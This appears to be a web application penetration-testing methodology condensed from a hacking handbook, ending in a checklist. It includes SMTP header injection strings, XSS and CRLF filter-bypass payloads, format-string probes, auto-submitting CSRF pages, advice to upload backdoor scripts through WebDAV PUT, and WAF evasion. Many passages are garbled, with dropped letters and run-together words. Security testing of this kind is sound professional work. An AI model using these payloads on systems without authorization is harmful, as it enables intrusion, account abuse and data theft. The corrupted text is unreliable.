<youremail>%0aCc:<youremail>

<youremail>%0d%0aCc:<youremail>

<youremail>%0aBcc:<youremail>

<youremail>%0d%0aBcc:<youremail>

%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a

%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a

Note any error messages the application returns.
If these appear to relate to any problem ithe e-mail function, investigate whether you need to fine-tune your input to exploit a vulnerability.

The application's responses may not indicate in any way whether a vulnerability exists or was successfully exploited.
You should monitor the e-mail address you specified to see if any mail is received.

Review closely the HTML form that generates the relevant request.
This may contain clues about the server-side software being used.
It may also contain a hidden or disabled field that specifies the e-mail's To address, which you can modify directly.

Manifestations of this type of vulnerability can be found in diverse locations.
Examples include account recovery tokens, token-based access to authenticated resources, and any other value being sent to the client side that needs to be either tamper-proof or unreadable to the user.

Look for locations where encryption (not hashing) is used in the application.
Determine any locations where the application encrypts or decrypts values supplied by a user, and attempt to substitute any other encrypted values encountered within the application.
Try to cause an error within the application that reveals the decrypted value or where the decrypted value is purposely displayed on-screen.

Look for an "oracle reveal" vulnerability by determining where an encrypted value can be supplied that results in the corresponding decrypted value's being displayed in the application's response.
Determine whether this leads to the disclosure of sensitive information, such as a password or credit card.

Look for an "oracle encrypt" vulnerability by determining where supplying a cleartext value causes the application to return a corresponding encrypted value.
Determine where this can be abused by specifying arbitrary values, or malicious payloads that the application will process.

When probing key functionality for logic flaws, try removing in turn each parameter submitted in requests, including cookies, query string fields, and items of POST data.

Be sure to delete the actual name of the parameter as well as its value.
Do not just submit an empty string, because typically the server handles this differently.

Attack only one parameter at a time to ensure that all relevant code paths within the application are reached.

If the request you are manipulating is part of a multistage process, follow the process through to completion, because some later logic may process data that was supplied in earlier steps and stored within the session.

The technique for finding and exploiting flaws of this kind is known as forced browsing.
It involves circumventing any controls imposed by in-browser navigatioothe sequence in which application functions may be accessed:

When a multistage process involves a defined sequence of requests, attempt to submit these requests out of the expected sequence.
Try skipping certain stages, accessing a single stage more than once, and accessing earlier stages after later ones.

The sequence of stages may be accessed via a series of GET or POST requests for distinct URLs, or they may involve submitting different sets of parameters to the same URL.
The stage being requested may be specified by submitting a function name or index within a request parameter.
Be sure to understand fully the mechanisms that the application is employing to deliver access to distinct stages.

From the context of the functionality that is implemented, try to understand what assumptions the developers may have made and where the key attack surface lies.
Try to identify ways of violating those assumptions to cause undesirable behavior within the application.

When multistage functions are accessed out of sequence, it is common to encounter a variety of anomalous conditions within the application, such as variables with null or uninitialized values, a partially defined or inconsistent state, and other unpredictable behavior.
In this situation, the application may return an interesting error message and debug output, which you cause to better understand its internal workings and thereby fine-tune the current or a different attack.
Sometimes, the application may get into a state entirely unanticipated by developers, which may lead to serious security flaws.

The flaws in this application were fundamental to its security, but none of them would have been identified by an attacker who simply intercepted browser requests and modified the parameter values being submitted.

Whenever aapplication implements a key action across multiple stages, you should take parameters that are submitted at one stage of the process and try submitting these to a different stage.
If the relevant items of data are updated within the application's state, you should explore the ramifications of this behavior to determine whether you can leverage it to carry out any malicious action, as in the preceding three examples.

If the application implements functionality whereby different categories of user can update or perform other actions on a common collectioof data, you should walk through the process using each type of user and observe the parameters submitted.
Where different parameters are ordinarily submitted by the different users, take each parameter submitted by one user and try to submit it as the other user.
If the parameter is accepted and processed as that user, explore the implications of this behavior as previously described.

In a complex application involving either horizontal or vertical privilege segregation, try to locate any instances where an individual user can accumulate aamount of state within his session that relates in some way to his identity.

Try to step through one area of functionality, and then switch to an unrelated area, to determine whether any accumulated state information has an effect othe application's behavior.

The first step in attempting to beat a business limit is to understand what characters are accepted withinthe relevant input that you control.

Try entering negative values, and see if the application accepts them and processes them in the way you would expect.

You may need to perform several steps to engineer a change in the application's state that can be exploited for a useful purpose.
For example, several transfers between accounts may be required until a suitable balance has been accrued that can actually be extracted.

In any situation where prices or other sensitive values are adjusted based on criteria that are determined by user-controllable data or actions, first understand the algorithms that the application uses and the point within its logic where adjustments are made.
Identify whether these adjustments are made on a one-time basis or whether they are revised in response to further actions performed by the user.

Think imaginatively.
Try to find a way of manipulating the application's behavior to cause it to get into a state where the adjustments it has applied do not correspond to the original criteria intended by its designers.
In the most obvious case, as just described, this may simply involve removing items from a shopping cart after a discount has been applied!

Whenever you probe an application for command injection and other flaws, having attempted to insert the relevant metacharacters into the data you control, always try placing a backslash immediately before each such character to test for the logic flaw just described.

Make a note of any instances in which the application modifies user input, in particular by truncating it, stripping out data, encoding, or decoding.
For any observed instances, determine whether a malicious string can be contrived:

If data is stripped once (nonrecursively), determine whether you can submit a string that compensates for this.
For example, if the application filters SQL keywords such as SELECT, submit SELSELECTECT and see if the resulting filtering removes the inner SELECT substring, leaving the word SELECT.

If data validation takes place in a set order and one or more validation processes modifies the data, determine whether this cabe used to beat one of the prior validation steps.
For example, if the application performs URL decoding and then strips malicious data such as the <script> tag, it may be possible to overcome this with strings such as:

%<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e

To detect a flaw of this kind, first catalog all the anomalous events and conditions that can be generated and that involve interesting user-specific information being returned to the browser in an unusual way, such as a debugging error message.

Using the application as two users in parallel, systematically engineer each conditiousing one or both users, and determine whether the other user is affected in each case.

Performing remote black-box testing for subtle thread safety issues of this kind is not straightforward.
It should be regarded as a specialized undertaking, probably necessary only ithe most security-critical of applications.

Target selected items of key functionality, such as login mechanisms, password change functions, and funds transfer processes.

For each function tested, identify a single request, or a small number of requests, that a given user cause to perform a single action.
Also find the simplest means of confirming the result of the action, such as verifying that a given user's login has resulted in access to that person's account information.

Using several high-spec machines, accessing the application from different network locations, script an attack to perform the same action repeatedly on behalf of several different users.
Confirm whether each action has the expected result.

Be prepared for a large volume of false positives.
Depending on the scale of the application's supporting infrastructure, this activity may well amount to a load test of the installation.
Anomalies may be experienced for reasons that have nothing to do with security.

Choose a unique arbitrary string that does not appear anywhere within the application and that contains only alphabetical characters and therefore is unlikely to be affected by any XSS-specific filters.
For example:
myxsstestdmqlwp 

Submit this string as every parameter to every page, targeting only one parameter at a time.

Monitor the application's responses for any appearance of this same string.
Make a note of every parameter whose value is being copied into the application's response.
These are not necessarily vulnerable, but each instance identified is a candidate for further investigation, as described in the next section.

Note that both GET and POST requests need to be tested.
You should include every parameter within both the URL query string and the message body.
Although a smaller range of delivery mechanisms exists for XSS vulnerabilities that can be triggered only by a POST request, exploitatiois still possible, as previously described.

In any cases where XSS was found ia POST request, use the "change request method" option in Burp to determine whether the same attack could be performed as a GET request.

In addition to the standard request parameters, you should test every instance in which the application processes the contents of a HTTP request header.
A common XSS vulnerability arises in error messages, where items such as the Referer and User-Agent headers are copied into the message's contents.
These headers are valid vehicles for delivering a reflected XSS attack, because an attacker cause a Flash object to induce a victim to issue a request containning arbitrary HTTP headers.

Do the following for each reflected input identified in the previous steps:

Review the HTML source to identify the location(s) where your unique string is being reflected.

If the string appears more than once, each occurrence needs to be treated as a separate potential vulnerability and investigated individually.

Determine, from the location within the HTML of the user-controllable string, how you need to modify it to cause execution of arbitrary script.
Typically, numerous different methods will be potential vehicles for an attack, as described later in this chapter.

Test your exploit by submitting it to the application.
If your crafted string is still returned unmodified, the application is vulnerable.
Double-check that your syntax is correct by using a proof-of-concept script to display an alert dialog, and confirm that this actually appears in your browser whethe response is rendered.

Having submitted a unique string to every possible location withinthe application, you must review all of the application's content and functionality once more to identify any instances where this string is displayed back to the browser.
User-controllable data entered in one location (for example, a name field on a personal information page) may be displayed in numerous places throughout the application.
(For example, it could be othe user's home page, in a listing of registered users, in work flow items such as tasks, on other users contact lists, in messages or questions posted by the user, or in application logs.)
Each appearance of the string may be subject to different protective filters and therefore needs to be investigated separately.

If possible, all areas of the application accessible by administrators should be reviewed to identify the appearance of any data controllable by non-administrative users.
For example, the application may allow administrators to review log files in-browser.
It is extremely common for this type of functionality to contain XSS vulnerabilities that an attacker can exploit by generating log entries containning malicious HTML.

When submitting a test string to each location within the application, it is sometimes insufficient simply to post it as each parameter to each page.
Many application functions need to be followed through several stages before the submitted data is actually stored.
For example, actions such as registering a new user, placing a shopping order, and making a funds transfer often involve submitting several different requests in a defined sequence.
To avoid missing any vulnerabilities, it is necessary to see each test case through to completion.

When probing for reflected XSS, you are interested in every aspect of a victim's request that you can control.
This includes all parameters to the request, every HTTP header, and so on.
In the case of stored XSS, you should also investigate any out-of-band channels through which the application receives and processes input you can control.
Any such channels are suitable attack vectors for introducing stored XSS attacks.
Review the results of your application mapping exercises to identify every possible area of attack surface.

If the application allows files to be uploaded and downloaded, always probe this functionality for stored XSS attacks.
Detailed techniques for testing this type of functionality are discussed later in this chapter.

Think imaginatively about any other possible means by which data you control may be stored by the application and displayed to other users.
For example, if the application search function shows a list of popular search items, you may be able to introduce a stored XSS payload by searching for it numerous times, even though the primary search functionality itself handles your input safely.

Using the results of your application mapping exercises, review every piece of client-side JavaScript for the following APIs, which may be used to access DOM data that can be controlled via a crafted URL:

document.location
document.URL
document.URLUnencoded
document.referrer
window.location

Be sure to include scripts that appear in static HTML pages as well as dynamically generated pages.
DOM-based XSS bugs may exist in any location where client-side scripts are used, regardless of the type of page or whether you see parameters being submitted to the page.

In every instance where one of the preceding APIs is being used, closely review the code to identify what is being done with the user-controllable data, and whether crafted input could be used to cause execution of arbitrary JavaScript.
In particular, review and test any instance where your data is being passed to any of the following APIs:

document.write()
document.writeln()
document.body.innerHtml
eval()
window.execScript()
window.setInterval()
window.setTimeout()

In every location where data submitted by one user is displayed to other users but you cannot perform a stored XSS attack, review whether the application's behavior leaves it vulnerable to OSRF.

The vulnerability typically arises where user-supplied data is inserted into the target of a hyperlink or other URL within the returned page.
Unless the application specifically blocks any characters you require (typically dots, slashes, and the delimiters used in the query string), it is almost certainly vulnerable.

If you discover an OSRF vulnerability, look for a suitable request to target in your exploit, as described ithe next section for cross-site request forgery.

Review the key functionality within the application, as identified in your application mapping exercises.

Find an application function that can be used to perform some sensitive action on behalf of an unwitting user, that relies solely on cookies for tracking user sessions, and that employs request parameters that an attacker can fully determine in advance that is, that do not contain any other tokens or unpredictable items.

Create an HTML page that issues the desired request without any user interaction.
For GET requests, you can place an <img> tag with the src attribute set to the vulnerable URL.
For POST requests, you can create a form that contains hidden fields for all the relevant parameters required for the attack and that has its target set to the vulnerable URL.
You can use JavaScript to autosubmit the form as soon as the page loads.

While logged into the application, use the same browser to load your crafted HTML page.
Verify that the desired action is carried out within the application.

You should always check for the /crossdomain.xml file on any web application you are testing.
Even if the application itself does not use Flash, if permissiois granted to another domain, Flash objects issued by that domaiare permitted to interact with the domain that publishes the policy.

If the application allows unrestricted access (by specifying <allowaccess-from domain="*" />), any other site can perform two-way interaction, riding othe sessions of application users.
This would allow all data to be retrieved, and any user actions to be performed, by any other domain.

If the application allows access to subdomains or other domains used by the same organization, two-way interaction is, of course, possible from those domains.
This means that vulnerabilities such as XSS on those domains may be exploitable to compromise the domain that grants permission.
Furthermore, if an attacker can purchase Flash-based advertising on any allowed domain, the Flash objects he deploys can be used to compromise the domain that grants permission.

Some policy files disclose intranet hostnames or other sensitive information that may be of use to an attacker.

To test an application's handling of cross-domain requests using XMLHttpRequest, you should try adding an Origin header specifying a different domain, and examine any Access-Control headers that are returned.
The security implications of allowing two-way access from any domain, or from specified other domains, are the same as those described for the Flash cross-domain policy.

If any cross-domain access is supported, you should also use OPTIONS requests to understand exactly what headers and other request details are permitted.

For each potentially vulnerable instance in which user-controllable input is copied into an HTTP header, verify whether the application accepts data containning URL-encoded carriage-retur(%0d) and line-feed (%0a) characters, and whether these are returned unsanitized in its response.

Note that you are looking for the actual newline characters themselves to appear in the server's response, not their URL-encoded equivalents.
If you view the response in an intercepting proxy, you should see an additional line in the HTTP headers if the attack was successful.

If only one of the two newline characters is returned ithe server's responses, it may still be possible to craft a working exploit, depending on the context.

If you find that the application is blocking or sanitizing newline characters, attempt the following bypasses:

foo%00%0d%0abar
foo%250d%250abar
foo%%0d0d%%0a0abar

Obtain a valid token by whatever means the application enables you to obtain one.

Access the logiform, and perform a login using this token.

If the login is successful and the application does not issue a new token, it is vulnerable to session fixation.

Obtain a sessiotokeas a completely anonymous user, and then walk through the process of submitting sensitive data, up until any page at which the sensitive data is displayed back.

If the same token originally obtained can now be used to retrieve the sensitive data, the application is vulnerable to session fixation.

If any type of session fixatiois identified, verify whether the server accepts arbitrary tokens it has not previously issued.
If it does, the vulnerability is considerably easier to exploit over an extended period.

Identify every instance within the application where a redirect occurs.

An effective way to do this is to walk through the application using an intercepting proxy and monitor the requests made for actual pages (as opposed to other resources, such as images, stylesheets, and script files).

If a single navigatioaction results in more than one request in succession, investigate what means of performing the redirect is being used.

If the user data being processed ia redirect contains an absolute URL, modify the domainame within the URL, and test whether the application redirects you to the different domain.

If the user data being processed contains a relative URL, modify this into an absolute URL for a different domain, and test whether the application redirects you to this domain.

In both cases, if you see behavior like the following, the application is certainly vulnerable to an arbitrary redirection attack:

GET /updates/8/?redir=http://mdattacker.net/ HTTP/1.1
Host: mdsec.net

HTTP/1.1 302 Object moved
Location: http://mdattacker.net/

Review all the cookies identified during your application mapping exercises.
If any Set-cookie instruction contains an expires attribute with a date that is in the future, this will cause the browser to persist that cookie until that date.
For example: UID=d475dfc6eccca72d0e expires=Fri, 10-Aug-18 16:08:29 GMT;

If a persistent cookie is set that contains any sensitive data, a local attacker may be able to capture this data.
Even if a persistent cookie contains an encrypted value, if this plays a critical role such as reauthenticating the user without entering credentials, an attacker who captures it can resubmit it to the application without actually deciphering its contents.

For any application pages that are accessed over HTTP and that contain sensitive data, review the details of the server's response to identify any cache directives.

The following directives prevent browsers from caching a page.
Note that these may be specified within the HTTP response headers or within HTML metatags:

Expires: 0
Cache-control: no-cache
Pragma: no-cache

If these directives are not found, the page concerned may be vulnerable to caching by one or more browsers.
Note that cache directives are processed on a per-page basis, so every sensitive HTTP-based page needs to be checked.

To verify that sensitive information is being cached, use a default installation of a standard browser, such as Internet Explorer or Firefox.
In the browser's configuration, completely clean its cache and all cookies, and then access the application pages that contain sensitive data.
Review the files that appear in the cache to see if any contain sensitive data.
If a large number of files are being generated, you can take a specific string from a page's source and search the cache for that string.

Here are the default cache locations for common browsers:

Internet Explorer—Subdirectories of C:\Documents and Settings\username\Local Settings\Temporary Internet Files\Content.IE5

Note that in Windows Explorer, to view this folder you need to enter this exact path and have hidden folders showing, or browse to the folder just listed from the command line.

Firefox (oWindows)—C:\Documents and Settings\username\
Local Settings\ApplicatioData\Mozilla\Firefox\Profiles\profile name\Cache

Firefox (oLinux)—~/.mozilla/firefox/profile name/Cache

Identify any instances within the application in which sensitive data is being transmitted via a URL parameter.

If any cases exist, examine the browser history to verify that this data has been stored there.

Review the HTML source code for any forms that contain text fields in which sensitive data is captured.

If the attribute autocomplete=off is not set, within either the form tag or the tag for the individual input field, data entered is stored within browsers where autocomplete is enabled.

Several plug-ins are available for Firefox, such as BetterPrivacy, which can be used to browse the LSO data created by individual applications.

You ca review the contents of the raw LSO data directly on disk.
The location of this data depends on the browser and operating system.
For example, on recent versions of Internet Explorer, the LSO data resides within the following folder structure:

C:\Users\{username}\AppData\Roaming\Macromedia\Flash Player\

#SharedObjects\{random}\{domainame}\{store name}\{name of SWF file}

You can review the contents of the raw Silverlight Isolated Storage data directly on disk.
For recent versions of Internet Explorer, this data resides within a series of deeply nested, randomly named folders at the following location:

C:\Users\{username}\AppData\LocalLow\Microsoft\Silverlight\

You can review the contents of the raw data stored in IE's userData directly on disk.
For recent versions of Internet Explorer, this data resides within the following folder structure:

C:\Users\user\AppData\Roaming\Microsoft\Internet Explorer\UserData\Low\{random}

A simple way to probe for ActiveX vulnerabilities is to modify the HTML that invokes the control, pass your own parameters to it, and monitor the results:

Vulnerabilities such as buffer overflows can be probed for using the same kind of attack payloads.
Triggering bugs of this kind in an uncontrolled manner is likely to result ia crash of the browser process that is hosting the control.

Inherently dangerous methods such as LaunchExe can oftebe identified simply by their name.
In other cases, the name may be innocuous or obfuscated, but it may be clear that interesting items such as filenames, URLs, or system commands are being passed as parameters.
You should try modifying these parameters to arbitrary values and determine whether the control processes your input as expected.

When you are probing the application for common vulnerabilities by submitting crafted attack strings idifferent parameters, always monitor the application's responses to identify any error messages that may contain useful information.

Attempt to force an error response from the application by supplying encrypted data strings in the wrong context, or by performing actions on resources that are not in the correct state to handle the action.

Be aware that error information that is returned within the server's response may not be rendered on-screen within the browser.
An efficient way to identify many error conditions is to search each raw response for keywords that are often contained in error messages.
For example:

error
exception
illegal
invalid
fail
stack
access
directory
file
not found
varchar
ODBC
SQL
SELECT

When you send a series of requests modifying parameters within a base request, check whether the original response already contains any of the keywords you are looking for to avoid false positives.

You can use the Grep function of Burp Intruder to quickly identify any occurrences of interesting keywords in any of the responses generated by a given attack.
Where matches are found, review the relevant responses manually to determine whether any useful error information has been returned.

Search for the text of any unusual error messages using standard search engines.
You can use various advanced search features to narrow down your results.
For example: "unable to retrieve" filetype:php

Review the search results, looking both for any discussion about the error message and for any other websites in which the same message has appeared.
Other applications may produce the same message in a more verbose context, enabling you to better understand what kind of conditions given rise to the error.
Use the search engine cache to retrieve examples of error messages that no longer appear within the live application.

Use Google code search to locate any publicly available code that may be responsible for a particular error message.
Search for snippets of error messages that may be hard-coded into the application's source code.
You can also use various advanced search features to specify the code language and other details if these are known.
For example: unable\ to\ retrieve lang:php package:mail

If you have obtained stack traces containing the names of library and third-party code components, search for these names on both types of search engines.

Review the results of your application mapping exercises to identify all server-side functionality and client-side data that may be used to obtain useful information.

Identify any locations within the application where sensitive data such as passwords or credit card details are transmitted from the server to the browser.
Even if these are masked on-screen, they are still viewable within the server's response.
If you have found another suitable vulnerability, such as within access controls or session handling, this behavior can be used to obtain the information belonging to other application users.

Differences in the timing of application responses may be subtle and difficult to detect.
In a typical situation, it is worth probing the application for this behavior only in selected key areas where a crucial item of interesting data is submitted and where the kind of processing being performed is likely to result in time differences.

To test a particular function, compile one list containing several items that are known to be valid (or that have been accessed recently) and a second list containing items that are known to be invalid (or dormant).
Make requests containing each item on these lists in a controlled way, issuing only one request at a time, and monitoring the time taken for the application to respond to each request.
Determine whether there is any correlation betweethe item's status and the time taken to respond.

You can use Burp Intruder to automate this task.
For every request it generates, Intruder automatically records the time taken before the application responds and the time taken to complete the response.
You can sort a table of results by either of these attributes to quickly identify any obvious correlations.

For each item of data being targeted, submit a range of long strings with lengths somewhat longer than common buffer sizes.
For example:
1100
4200
33000

Target one item of data at a time to maximize the coverage of code paths within the application.

You can use the character blocks payload source in Burp Intruder to automatically generate payloads of various sizes.

Monitor the application's responses to identify any anomalies.
An uncontrolled overflow is almost certain to cause an exception in the application.
Detecting when this has occurred in a remote process is difficult, but here are some anomalous events to look for:

AHTTP 500 status code or error message, where other malformed (but not overlong) input does not have the same effect.

An informative message, indicating that a failure occurred in some native code component.

A partial or malformed response is received from the server.

The TCP connectioto the server closes abruptly without returning a response.

The entire web application stops responding.

Note that when a heap-based overflow is triggered, this may result in a crash at some future point, rather than immediately.
You may need to experiment to identify one or more test cases that are causing heap corruption.

An off-by-one vulnerability may not cause a crash, but it may result in anomalous behavior such as unexpected data being returned by the application.

Having identified targets for testing, you need to send suitable payloads designed to trigger any vulnerabilities.
For each item of data being targeted, send a series of different values in turn, representing boundary cases for the signed and unsigned versions of different sizes of integer.
For example:
0x7f and 0x80 (127 and 128)
0xff and 0x100 (255 and 256)

x7ffff and 0x8000 (32767 and 32768)
0xffff and 0x10000 (65535 and 65536)
0x7fffffff and 0x80000000 (2147483647 and 2147483648)
0xffffffff and 0x0 (4294967295 and 0)

When the data being modified is represented in hexadecimal form, you should send little-endiaas well as big-endian versions of each test case - for example, ff7f as well as 7fff.
If hexadecimal numbers are submitted in ASCII form, you should use the same case that the application itself uses for alphabetical characters to ensure that these are decoded correctly.

You should monitor the application's responses for anomalous events in the same way as described for buffer overflow vulnerabilities.

Targeting each parameter in turn, submit strings containing large numbers of the format specifiers %and %s:

%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s

Note that some format string operations may ignore the %specifier for security reasons.
Supplying the %s specifier instead causes the function to dereference each parameter on the stack, probably resulting in an access violation if the application is vulnerable.

The Windows FormatMessage function uses specifiers ia different way than the printf family.
To test for vulnerable calls to this function, you should use the following strings:
%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...
%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...

Remember to URL-encode the % character as %25.

You should monitor the application's responses for anomalous events in the same way as described for buffer overflow vulnerabilities.

As described throughout this book, for any vulnerability you identify within the application, think imaginatively about how this can be exploited to achieve your objectives.
Countless successful hacks against web applications begin from a vulnerability that is intrinsically limited in its impact.
By exploiting trust relationships and undercutting controls implemented elsewhere withinthe application, it may be possible to leverage a seemingly minor defect to carry out a serious breach.

If you succeed iperforming arbitrary command execution on any component of the application, and you can initiate network connections to other hosts, consider ways of directly attacking other elements of the application's infrastructure at the network and operating system layers to expand the scope of your compromise.

Examine the access mechanisms provided for customers of the shared environment to update and manage their content and functionality.

Consider questions such as the following:

Does the remote access facility use a secure protocol and suitably hardened infrastructure?

Can customers access files, data, and other resources that they do not legitimately need to access?

Can customers gain an interactive shell within the hosting environment and perform arbitrary commands?

If a proprietary application is used to allow customers to configure and customize a shared environment, consider targeting this application as a means of compromising the environment itself and individual applications running within it.

If you can achieve command execution, SQL injection, or arbitrary file access within one application, investigate carefully whether this provides any means of escalating your attack to target other applications.

If you are attacking an ASP-hosted application that is made up of both shared and customized components, identify any shared components such as logging mechanisms, administrative functions, and database code components.
Attempt to leverage these to compromise the shared portion of the application and thereby attack other individual applications.

If a common database is used within any kind of shared environment, perform a comprehensive audit of the database configuration, patch level, table structure, and permissions, perhaps using a database scanning tool such as NGSSquirrel.
Any defects within the database security model may provide a means of escalating an attack from within one application to another.

Review the results of your application mapping exercises to identify the web server and other technologies in use that may contain accessible administrative interfaces.

Perform a port scan of the web server to identify any administrative interfaces running oa different port to the main target application.

For any identified interfaces, consult the manufacturer's documentatioand the listings of common passwords to obtain default credentials.
Use Metasploit's built-in database to scan the server.

If you gain access to an administrative interface, review the available functionality, and determine whether this can be used to further compromise the host and attack the main application.

Tools such as Nikto are effective at locating much default web content.

Use search engines and other resources to identify default content and functionality included within the technologies known to be in use.
If feasible, carry out a local installation of these, and review them for any default functionality that you may be able to leverage in your attack.

For each directory discovered on the web server during application mapping, make a request for just this directory, and identify any cases where a directory listing is returned.

To test the server's handling of different HTTP methods, you will need to use a tool such as Burp Repeater, which allows you to send an arbitrary request with full control over the message headers and body.

Use the OPTIONS method to list the HTTP methods that the server states are available.
Note that different methods may be enabled in different directories.

In many cases, methods may be advertised as available that you cannot in fact use.
Sometimes, a method may be usable even though it is not listed in the response to the OPTIONS request.
Try each method manually to confirm whether it can in fact be used.

If you find that some WebDAV methods are enabled, it is often easiest to use a WebDAV-enabled client for further investigation, such as Microsoft FrontPage or the Opeas Web Folder optiowithinInternet Explorer.

Attempt to use the PUT method to upload a benign file, such as a text file.

If this is successful, try uploading a backdoor script using PUT.

If the necessary extension for the backdoor to operate is being blocked, try uploading the file with a .txt extension and using the MOVE method to move it to a file with a new extension.

If any of the preceding methods fails, try uploading a JAR file, or a file with contents that a browser will render as HTML.

Recursively step through all the directories using a tool such as davtest.pl.

Using both GET and CONNECT requests, try to use the web server as a proxy to connect to other servers on the Internet and retrieve content from them.

Using both techniques, attempt to connect to different IP addresses and ports within the hosting infrastructure.

Using both techniques, attempt to connect to common port numbers on the web server itself by specifying 127.0.0.1 as the target host in the request.

Submit GET requests to the root directory using the following:

The correct Host header.
An arbitrary Host header.
The server's IP address in the Host header.
No Host header.

Compare the responses to these requests.
For example, when an IP address is used in the Host header, the server may simply respond with a directory listing.
You may also find that different default content is accessible.

If you observe different behavior, repeat your application mapping exercises using the Host header that generated different results.
Be sure to perform a Nikto scan using the -v host option to identify any default content that may have been overlooked during initial application mapping.

The presence of a web application firewall can be deduced using the following steps:

Submit an arbitrary parameter name to the application with a clear attack payload in the value, ideally somewhere the application includes the name and/or value ithe response.
If the application blocks the attack, this is probably due to an external defense.

If a variable can be submitted that is returned ia server response, submit a range of fuzz strings and encoded variants to identify the behavior of the application defenses to user input.

Confirm this behavior by performing the same attacks on variables within the application.
You can try the following strings to attempt to bypass a web application firewall:

For all fuzzing strings and requests, use benign strings for payloads that are unlikely to exist in a standard signature database.
Giving examples of these is, by definition, not possible.
But you should avoid using /etc/passwd or /windows/system32/config/sam as payloads for file retrieval.
Also avoid using terms such as <script> in a XSS attack and using alert() or xss as XSS payloads.

If a particular request is blocked, try submitting the same parameter in a different location or context.
For instance, submit the same parameter in the URL in a GET request, within the body of a POST request, and within the URL in a POST request.

OASP.NET, also try submitting the parameter as a cookie.
The API Request.Params["foo"] retrieves the value of a cookie named foo if the parameter foo is not found in the query string or message body.

Determine locations where user input is (or can be) submitted in a nonstandard format such as serialization or encoding.
If none are available, build the attack string by concatenation and/or by spanning it across multiple variables. 
Note that if the target is ASP.NET, you may be able to use HPP to concatenate the attack using multiple specifications of the same variable.)

#######################################################################################
############################ Short Version ############################################
### HTTP encoding ###

in HTTP     escape with
&           %26
=           %3d
?           %3f
blank       %20
+           %2b
;           %3b
#           %23
%           %25
null        %00 or %0a

### Explore Visible Content ###

browse the entire application in the normal way
every link, URL, submit forms
with & without java script
with & without cookies
as logged and anonymous user

-> create site map

use automatic web spider/crawler
do not crawl dangerous URL (breaking application / delete user etc)


### Consult Public Resources ###

use internet search engines
wayback machine
google dorks (site:XX link:YY)
search for names/email addresses discovered in app content
review published WSDL files


### Discover Hidden Content ###

create list/scheme for possible content
make manual requests for known valid and invalid resources (compare)
-> establish a way to identify when an item does not exist
understand naming conventions: AddDocument.jsp, ViewDocument.jsp, EditDocument.jsp...
review client-side code to idnetify clues about hidden server-side (HTML comment/ disabled forms)
make automatic requests/spidering based on your directory, filename, and file extension lists


### Discover Default Content ###

run nikto for default content
set –root and -404 (custom File Not Found page) options
run nikto againt root of IP address aswell as the server name


### Enumerate Identifier-Specified Functions ###

identify specific application functions accesses by passing an identifier
/admin.jsp?action=editUser or /main.php?func=A21
use common function names / naming scheme


### Test Debug Parameters ### (Chapter 14)

try functions with hidden debug parameters (debug=true)
mostly in login, search, file upload/download functions
use common debug parameter: true, yes, on, 1


### Identify Webapp Functionality ###

identify redirects, off-site links, error messages, administrative, logging functions
identify any functionality that diverges from the standard GUI


### Identify Data Entry Points ###

different entry points for user input
URL, query srings, POST, cookies, HTTP headers
username, age, description, etc
out-of-band channels web mail rendering messages received via SMTP


### Identify Technologies Used ###

client-side: forms, scripts, cookies, Java applets, ActiveX controls, Flash objects
server-side: databases, webserver, e-mail systems, application banner in HTTP server header
identify third-party code and search (with Google inurl:XX) other websites using this code


### Map Attack Surface ### (Chapter 4)

identify functionality that triggers server-side application
example: retrieve customer orders interacts with database
file upload functions - path traversal
inter-user messaging - XSS
Contact Us functions - SMTP injection
prioritizing the most interesting-looking functionality


### Test Transmission Data Via Client ### (Chapter 5)

find hidden form fields, cookies, URL parameters used to transmit data via the client
determine the purpose of this items
modify the items value
decipher opaque data (obsfucated / encrypted) and submit arbitrary data
if ASP.NET ViewState in use, test if tampering is possible
use the ViewState analyzer of Burp Suite to check status of EnableViewStateMac (ViewStates contents cannot be modified)
modify ViewState and submit - if modificated value is accepted use ViewState as input channel for arbitrary data


### Test Client-Side Controls Over User Input ###

check length limits etc in Java Script and try to bypass
Confirm if application is relying on the client-side controls
review HTML form for disabled elements and modify them
<input disabled="true" name="product">


### Understand Client Applications Operation ###

check if data is serialized (use Burp AMF support for deserialization)
modify server responses and observe reaction of client side code


### Decompile Client ###

identify applets:
.class, .jar - Java
.swf - Flash
.xap - Silverlight
<applet code=”input.class” id=”TheApplet” codebase=”/scripts/”></applet>
review calls made to the applets (from eithin HTML) and check if result is send to server and try to modify
download applet bytecode by entering URL and decompile it
Java — Jad
Flash — SWFScan, Flasm/Flare
Silverlight — .NET Reflector
unpack packages (JAR, XAP, SWF)
review source code, modify, recompile and execute


### Attach Debugger ###

large client-side apps are often prohibit to decompile
use runtime debugger
Java - JavaSnoop
Silverlight - Silverlight Spy
place breakpoints and modify arguments for security bypass


### Test ActiveX Controls ###

look for .cab files
codebase="https://wahh app.com/scripts/input.cab"
use COMRaider tool
use Filenom & Regmon
modify HTML used to invoke arbitrary bypass
search for dangerous-sounding names like LaunchExe


### Understand Mechanism ###

locate all authentication-related functionality
login, registration, account recovery, etc
how can you get an account


### Test Password Quality ###

find minimum quality rules for passwords
attempt to set various kinds of weak passwords for your user
short, only alphabetic, only numeric, current username, dictionary words
test for incomplete validation of credentials
set strong password and try to login using different variation of pw
rm last char, change case, rm special char
identify built-in accounts that are not subject to the standard password requirement


### Test Username Enumeration ###

identify locations for authentication functions for usernames
input field (on screen / hidden), cookie
login, registration, password change, logout, account recovery
for each location submit valid and invalid username
compare results of responses
HTTP status code, rediraction, redirects, information displayed on-screen, HTML content, time
use WebScarab for comparing
check if observed diffrences occurs with different usernames
search for vulnerabilties offering possiblity of compiling a userlist
logging functionality, userlists, email addresses, code comments
locate subdirectories accepting a username


### Test Resilience Password Guessing ###

locate positions of submitting credentials
main log in, password change function
manually send multiple requests containing valid username but other invalid credentials
monitor application response
at about 10 failed logins submit valid login
